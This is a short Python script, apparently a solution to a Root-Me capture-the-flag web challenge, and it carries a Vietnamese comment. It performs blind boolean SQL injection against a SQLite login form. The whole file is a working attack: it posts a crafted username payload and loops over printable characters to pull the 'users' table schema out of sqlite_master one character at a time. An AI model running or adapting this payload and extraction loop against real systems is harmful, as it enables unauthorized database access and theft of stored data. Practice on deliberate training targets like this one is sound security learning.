import requests
import string

url = 'http://challenge01.root-me.org/web-serveur/ch10/'
characters = string.printable
flag = ''

command = "SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='users'"

for i in range(0, 30):
	for c in characters:
		payload = f"hi_mom' or 1=1 and hex(substr(({command}),{len(flag)+1},1))=hex('{c}')-- -"
		data = {
			'username': payload,
			'password': '1'
		}
		print(flag+c)
		r = requests.post(url, data=data)
		if 'Your informations' in r.text:
			flag += c
			print('[FOUND] - '+ flag)
			break

# Tăng cường dùng hex, ascii convert để so sánh!